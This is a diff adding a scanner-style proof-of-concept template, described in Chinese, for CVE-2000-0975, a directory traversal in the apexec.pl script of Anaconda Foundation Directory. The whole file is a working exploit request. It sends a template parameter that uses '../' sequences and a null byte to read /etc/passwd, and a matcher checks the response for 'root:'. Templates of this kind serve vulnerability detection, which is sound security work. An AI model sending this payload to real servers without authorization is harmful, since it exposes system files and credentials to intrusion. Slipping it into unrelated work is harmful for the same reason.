@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "验证 Anaconda Foundation Directory 的 apexec.pl 脚本存在的目录遍历漏洞，攻击者可通过构造包含 '../'（点点斜杠）的路径参数绕过目录访问限制，读取服务器上的任意文件，尤其关注读取敏感文件如 /etc/passwd 等"
+id = "POC-AVE-2000-0710"
+name = "CVE-2000-0975 Directory Traversal PoC"
+severity = "medium"
+tags = ["ave-2000-0710"]
+vuln_id = [
+    "CVE-2000-0975",
+    "AVE-2000-0710",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/apexec.pl"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+etype = "odp"
+passurl = "/category/"
+template = "../../../../../../../etc/passwd%00.html"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
